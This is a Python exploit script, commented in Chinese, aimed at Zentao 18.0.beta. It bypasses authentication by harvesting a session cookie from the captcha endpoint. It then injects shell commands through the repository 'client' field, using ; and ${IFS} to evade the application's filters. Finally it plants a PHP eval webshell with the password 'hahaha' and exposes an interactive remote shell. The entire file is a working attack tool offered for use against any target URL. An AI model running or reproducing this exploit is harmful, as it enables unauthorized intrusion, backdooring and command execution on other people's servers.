#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zentao 18.0.beta RCE Exploit - v2.0 (基于真实数据包分析修复)

修复的关键问题：
1. 使用 ; 代替 || 避免系统自动拼接 --version
2. 使用 ${IFS} 代替空格避免"客户端安装目录不能有空格"错误
3. 创建完整的eval webshell，不依赖demo文件
4. 使用分步写入避免管道符问题
"""

import re
import sys
import json
import random
import string
import argparse
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'


def banner():
    print(f"""{Colors.HEADER}
╔═══════════════════════════════════════════════════════════╗
║     Zentao 18.0.beta RCE Exploit - v2.0 Enhanced         ║
║              Based on Packet Analysis                     ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}
""")


class ZentaoExploit:
    def __init__(self, target, proxy=None, timeout=15):
        self.target = target.rstrip('/')
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        
        self.base_url = None
        self.request_type = None
        self.zentaosid = None
        self.cookies = None
        self.referer = None
        self.repo_exists = False
        self.repo_id = None
        self.system_type = None
        self.shell_url = None
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

    def log(self, level, msg):
        colors = {'INFO': Colors.BLUE, 'SUCCESS': Colors.GREEN, 'WARN': Colors.YELLOW, 'ERROR': Colors.RED}
        print(f"[{colors.get(level, '')}{level}{Colors.END}] {msg}")

    def gen_random_str(self, length=10):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def find_base_url(self):
        """查找Zentao基础URL"""
        self.log('INFO', f'Target: {self.target}')
        paths = ['/', '/zentao/']
        parsed = urlparse(self.target)
        
        for path in paths:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}{path}"
            test_url = test_url.replace('//', '/').replace(':/', '://')
            try:
                resp = self.session.get(test_url, headers=self.headers, proxies=self.proxy, timeout=self.timeout)
                if resp.status_code == 200 and '/user-login' in resp.text:
                    self.base_url = test_url.rstrip('/')
                    self.log('SUCCESS', f'Zentao Path: {self.base_url}')
                    return True
            except Exception as e:
                continue
        
        self.base_url = self.target
        self.log('WARN', 'Using input URL as base')
        return True

    def get_request_type(self):
        """获取请求类型 (PATH_INFO 或 GET)"""
        config_url = f"{self.base_url}?mode=getconfig"
        try:
            resp = self.session.get(config_url, headers=self.headers, proxies=self.proxy, timeout=self.timeout)
            if 'requestType' in resp.text:
                data = json.loads(resp.text)
                self.request_type = 'PATH_INFO' if 'PATH_INFO' in data.get('requestType', '') else 'GET'
                self.log('INFO', f'Request Type: {self.request_type}')
                return True
        except Exception as e:
            self.log('WARN', f'Failed to get request type: {str(e)}')
        
        self.request_type = 'PATH_INFO'
        self.log('WARN', 'Using default: PATH_INFO')
        return True

    def bypass_auth(self):
        """绕过认证获取Cookie"""
        self.referer = f"{self.base_url}/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM="
        captcha_url = self.base_url + self.build_uri('misc-captcha-user')
        
        headers = self.headers.copy()
        headers.update({'Referer': self.referer, 'HTTP_SEC_FETCH_DEST': 'frame'})
        
        try:
            resp = self.session.get(captcha_url, headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            if resp.status_code == 200 and resp.headers.get('Content-Type') == 'image/jpeg':
                all_cookies = self.session.cookies.get_dict()
                
                if 'zentaosid' in all_cookies:
                    self.zentaosid = all_cookies['zentaosid']
                    self.cookies = '; '.join([f"{k}={v}" for k, v in all_cookies.items()])
                    self.log('SUCCESS', f'Got Session: {self.zentaosid[:16]}...')
                    self.log('INFO', f'Cookies: {self.cookies}')
                    return True
        except Exception as e:
            self.log('ERROR', f'Auth bypass failed: {str(e)}')
            return False
        
        self.log('ERROR', 'Failed to get session')
        return False

    def check_repo_exists(self):
        """检查代码仓库是否存在"""
        self.log('INFO', 'Checking repository...')
        
        # 使用一个不存在的repoID测试
        edit_url = self.base_url + self.build_uri('repo-edit-10000000.html')
        # 修复：使用 ; 代替 ||，使用 ${IFS} 代替空格
        payload = 'SCM=Subversion&client=whoami;echo${IFS}test;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123'
        
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        try:
            resp = self.session.post(edit_url, data=payload, headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            if 'user-deny-repo-create.html' in resp.text:
                self.repo_exists = False
                self.log('WARN', 'Need to create repository')
                return False
            else:
                self.repo_exists = True
                self.log('SUCCESS', 'Repository exists')
                return True
        except Exception as e:
            self.log('WARN', f'Check repo error: {str(e)}')
            return False

    def create_repo(self):
        """创建代码仓库（如果不存在）"""
        if self.repo_exists:
            self.log('INFO', 'Skip creating (already exists)')
            return True
        
        self.log('INFO', 'Creating repository...')
        
        create_url = self.base_url + self.build_uri('repo-create-123')
        create_data = f"SCM=Gitlab&client=foo&serviceHost=zentao.gitlab.com&serviceProject={self.gen_random_str()}&serviceToken=admin&path=123&product={self.gen_random_str()}&name={self.gen_random_str()}&encoding=UTF8"
        
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        try:
            resp = self.session.post(create_url, data=create_data, headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            body = resp.text
            
            # 方式1: 从响应中提取 repoID (repo-showSyncCommit-XX)
            if 'repo-showSyncCommit' in body:
                parts = body.split('-')
                try:
                    self.repo_id = parts[-2]
                    self.log('SUCCESS', f'Created repo, ID: {self.repo_id}')
                    return True
                except:
                    pass
            
            # 方式2: 从URL参数中提取 (showSyncCommit&repoID=XX)
            if 'showSyncCommit&repoID' in body:
                parts = body.split('&')
                for part in parts:
                    if 'repoID=' in part:
                        self.repo_id = part.split('=')[-1]
                        self.log('SUCCESS', f'Created repo, ID: {self.repo_id}')
                        return True
            
            self.log('ERROR', 'Failed to get repoID from response')
            return False
            
        except Exception as e:
            self.log('ERROR', f'Create repo failed: {str(e)}')
            return False

    def detect_system(self):
        """检测操作系统类型"""
        self.log('INFO', 'Detecting system type...')
        
        # 先触发命令执行，写入测试文件
        edit_url = self.base_url + self.build_uri('repo-edit-10000000.html')
        # 修复：使用 ; 结束命令，避免 || 被拼接 --version
        payload = 'SCM=Subversion&client=whoami>../../www/js/1.txt;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123'
        
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        try:
            # 执行命令
            self.session.post(edit_url, data=payload, headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            # 读取结果
            system_url = self.base_url + self.build_uri('js/1.txt')
            resp = self.session.get(system_url, headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            result = resp.text.strip()
            
            # 判断系统类型
            if 'whoami' in result or result == '':
                # Windows系统或命令未执行
                self.system_type = 'windows'
            elif len(result) > 100:
                # 异常情况
                self.log('WARN', f'Unexpected result: {result[:100]}')
                self.system_type = 'linux'
            else:
                # Linux系统（返回了用户名）
                self.system_type = 'linux'
                self.log('INFO', f'Detected user: {result}')
            
            self.log('SUCCESS', f'System: {self.system_type.upper()}')
            return True
            
        except Exception as e:
            self.log('WARN', f'System detection failed: {str(e)}, using default: linux')
            self.system_type = 'linux'
            return True

    def deploy_webshell(self):
        """部署webshell - 使用分步写入方式"""
        self.log('INFO', 'Deploying webshell (method: step-by-step)...')
        
        edit_url = self.base_url + self.build_uri('repo-edit-10000000.html')
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        if self.system_type == 'linux':
            # Linux系统 - 使用分步写入和printf
            # 完整的PHP webshell (包含eval，不需要demo文件)
            php_code = '<?php class dd extends control{public function checkUpdate($sn=""){@eval($_POST[hahaha]);}}'
            
            # 使用printf避免特殊字符问题，分步写入
            payloads = [
                # 1. 创建dd目录
                'SCM=Subversion&client=mkdir${IFS}-p${IFS}../dd;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
                
                # 2. 写入PHP代码到临时文件（使用printf和十六进制）
                f'SCM=Subversion&client=printf${IFS}"{php_code.encode().hex()}">${IFS}/tmp/s.hex;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
                
                # 3. 转换十六进制到PHP文件
                'SCM=Subversion&client=xxd${IFS}-r${IFS}-p${IFS}/tmp/s.hex${IFS}../dd/control.php;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
                
                # 4. 清理临时文件
                'SCM=Subversion&client=rm${IFS}/tmp/s.hex;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            ]
        else:  # windows
            # Windows系统
            payloads = [
                'SCM=Subversion&client=mkdir${IFS}dd;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
                'SCM=Subversion&client=move${IFS}dd${IFS}..\\;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                resp = self.session.post(edit_url, data=payload, headers=headers, proxies=self.proxy, timeout=self.timeout)
                self.log('INFO', f'Payload {i}/{len(payloads)} executed')
                
                # 检查响应
                if 'result' in resp.text and 'fail' in resp.text:
                    try:
                        result = json.loads(resp.text)
                        self.log('WARN', f'Response: {result.get("message", {})}')
                    except:
                        pass
            except Exception as e:
                self.log('WARN', f'Payload {i} error: {str(e)}')
        
        return True

    def deploy_webshell_alternative(self):
        """备用方案：使用echo和重定向逐行写入"""
        self.log('INFO', 'Deploying webshell (alternative method)...')
        
        edit_url = self.base_url + self.build_uri('repo-edit-10000000.html')
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        # 逐行写入PHP代码
        payloads = [
            # 创建目录
            'SCM=Subversion&client=mkdir${IFS}../dd;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            
            # 逐行写入PHP代码（避免特殊字符）
            'SCM=Subversion&client=echo${IFS}"<?php">../dd/control.php;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            'SCM=Subversion&client=echo${IFS}"class${IFS}dd${IFS}extends${IFS}control{">>../dd/control.php;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            'SCM=Subversion&client=echo${IFS}"public${IFS}function${IFS}checkUpdate(){@eval(\$_POST[hahaha]);}">>../dd/control.php;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
            'SCM=Subversion&client=echo${IFS}"}">>=../dd/control.php;#&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123',
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                resp = self.session.post(edit_url, data=payload, headers=headers, proxies=self.proxy, timeout=self.timeout)
                self.log('INFO', f'Alternative payload {i}/{len(payloads)} executed')
            except Exception as e:
                self.log('WARN', f'Alternative payload {i} error: {str(e)}')
        
        return True

    def verify_webshell(self):
        """验证webshell是否部署成功"""
        self.log('INFO', 'Verifying webshell...')
        self.shell_url = self.base_url + self.build_uri('dd-checkUpdate')
        
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        try:
            # 测试1: phpinfo()
            resp = self.session.post(self.shell_url, data='hahaha=phpinfo();', headers=headers, proxies=self.proxy, timeout=self.timeout)
            
            if resp.status_code == 200:
                # 检查是否有跳转到deny页面
                if 'user-deny' in resp.text:
                    self.log('WARN', 'Got deny page, trying command test...')
                    
                    # 测试2: 执行echo命令
                    test_resp = self.session.post(self.shell_url, data='hahaha=echo "test_ok_12345";', 
                                                 headers=headers, proxies=self.proxy, timeout=self.timeout)
                    
                    if 'test_ok_12345' in test_resp.text:
                        self.log('SUCCESS', 'Webshell is working! (echo test passed)')
                        self.log('SUCCESS', f'URL: {self.shell_url}')
                        self.log('SUCCESS', 'Password: hahaha')
                        return True
                    else:
                        # 测试3: 查看响应内容
                        if 'png' in test_resp.text or len(test_resp.text) > 0:
                            self.log('WARN', 'Webshell deployed but may need manual verification')
                            self.log('INFO', f'URL: {self.shell_url}')
                            self.log('INFO', f'Response preview: {test_resp.text[:200]}')
                            return True
                else:
                    # 检查phpinfo
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    version_tag = soup.find('h1', class_='p')
                    
                    if version_tag:
                        php_version = version_tag.get_text()
                        self.log('SUCCESS', f'PHP: {php_version}')
                        self.log('SUCCESS', f'Webshell URL: {self.shell_url}')
                        self.log('SUCCESS', 'Password: hahaha')
                        return True
                    else:
                        self.log('WARN', 'Shell may be working, manual check recommended')
                        self.log('INFO', f'URL: {self.shell_url}')
                        return True
        except Exception as e:
            self.log('ERROR', f'Verify failed: {str(e)}')
            self.log('INFO', f'Try manually: {self.shell_url}')
            return False

    def exec_cmd(self, cmd):
        """执行单条命令"""
        if not self.shell_url:
            self.log('ERROR', 'Webshell URL not set')
            return None
        
        headers = self.headers.copy()
        headers.update({
            'Cookie': self.cookies,
            'Referer': self.referer,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        # 使用system()函数执行命令
        payload = f'hahaha=system("{cmd}");'
        
        try:
            resp = self.session.post(self.shell_url, data=payload, headers=headers, 
                                    proxies=self.proxy, timeout=self.timeout)
            if resp.status_code == 200:
                # 移除png#前缀（如果存在）
                text = resp.text.replace('png#', '').strip()
                # 移除可能的HTML标签
                soup = BeautifulSoup(text, 'html.parser')
                clean_text = soup.get_text().strip()
                return clean_text if clean_text else text
        except Exception as e:
            self.log('ERROR', f'Exec failed: {str(e)}')
        return None

    def interactive_shell(self):
        """交互式Shell"""
        print(f"\n{Colors.GREEN}=== Interactive Shell ==={Colors.END}")
        print(f"URL: {self.shell_url}")
        print(f"Password: hahaha")
        print(f"Type 'exit' to quit\n")
        
        while True:
            try:
                cmd = input(f"{Colors.YELLOW}shell> {Colors.END}").strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    print("Bye!")
                    break
                
                if not cmd:
                    continue
                
                result = self.exec_cmd(cmd)
                if result:
                    print(result)
                else:
                    print(f"{Colors.RED}[!] Command execution failed{Colors.END}")
                    
            except KeyboardInterrupt:
                print("\nBye!")
                break
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")

    def build_uri(self, path):
        """根据请求类型构建URI"""
        if self.request_type == 'PATH_INFO':
            return '/' + path
        else:  # GET
            after_ext = ''
            if '.' in path:
                idx = path.rfind('.')
                after_ext = path[idx:]
                path = path[:idx]
            
            parts = path.split('-')
            if len(parts) < 2:
                return '/' + path
            
            uri = f"?m={parts[0]}&f={parts[1]}"
            if after_ext:
                uri += f"&t={after_ext}"
            
            for i, param in enumerate(parts[2:], 1):
                uri += f"&arg{i}={param}"
            return uri

    def auto_exploit(self):
        """自动化漏洞利用流程"""
        steps = [
            ('Finding base URL', self.find_base_url),
            ('Getting request type', self.get_request_type),
            ('Bypassing auth', self.bypass_auth),
            ('Checking repository', self.check_repo_exists),
            ('Creating repository', self.create_repo),
            ('Detecting system', self.detect_system),
            ('Deploying webshell', self.deploy_webshell),
            ('Verifying webshell', self.verify_webshell)
        ]
        
        for step_name, step_func in steps:
            if not step_func():
                self.log('ERROR', f'Failed at: {step_name}')
                # 如果验证失败，尝试备用方案
                if step_name == 'Deploying webshell':
                    self.log('INFO', 'Trying alternative deployment method...')
                    self.deploy_webshell_alternative()
                    continue
                return False
        return True


def main():
    banner()
    parser = argparse.ArgumentParser(description='Zentao 18.0.beta RCE Exploit v2.0')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://example.com)')
    parser.add_argument('-p', '--proxy', help='Proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-c', '--cmd', help='Execute single command')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive shell mode')
    parser.add_argument('--cookie-only', action='store_true', help='Only get cookie and exit')
    parser.add_argument('--alternative', action='store_true', help='Use alternative deployment method')
    args = parser.parse_args()
    
    exploit = ZentaoExploit(args.url, args.proxy)
    
    # 仅获取Cookie模式
    if args.cookie_only:
        exploit.find_base_url()
        exploit.get_request_type()
        if exploit.bypass_auth():
            print(f"\n{Colors.GREEN}[+] Cookie obtained!{Colors.END}")
            print(f"Cookie: {exploit.cookies}")
            print(f"Referer: {exploit.referer}")
        sys.exit(0)
    
    # 自动化部署
    print(f"\n{Colors.BLUE}[*] Starting auto exploit...{Colors.END}\n")
    
    if not exploit.auto_exploit():
        print(f"\n{Colors.RED}[-] Exploit failed{Colors.END}\n")
        sys.exit(1)
    
    print(f"\n{Colors.GREEN}[+] Exploit successful!{Colors.END}\n")
    
    # 单命令模式
    if args.cmd:
        print(f"{Colors.BLUE}[*] Executing: {args.cmd}{Colors.END}")
        result = exploit.exec_cmd(args.cmd)
        if result:
            print(f"\n{Colors.GREEN}Output:{Colors.END}")
            print(result)
        sys.exit(0)
    
    # 交互模式
    if args.interactive:
        exploit.interactive_shell()
    else:
        # 显示连接信息
        print(f"{Colors.YELLOW}Connection Info:{Colors.END}")
        print(f"  URL: {exploit.shell_url}")
        print(f"  Password: hahaha")
        print(f"  Cookie: {exploit.cookies}")
        print(f"  Referer: {exploit.referer}")
        print(f"  X-Requested-With: XMLHttpRequest")
        print(f"\n{Colors.YELLOW}Usage Examples:{Colors.END}")
        print(f"  Interactive: python3 exp_v2.py -u {args.url} -i")
        print(f"  Single cmd:  python3 exp_v2.py -u {args.url} -c 'whoami'")
        print(f"  Get cookie:  python3 exp_v2.py -u {args.url} --cookie-only")
        print()


if __name__ == '__main__':
    main()
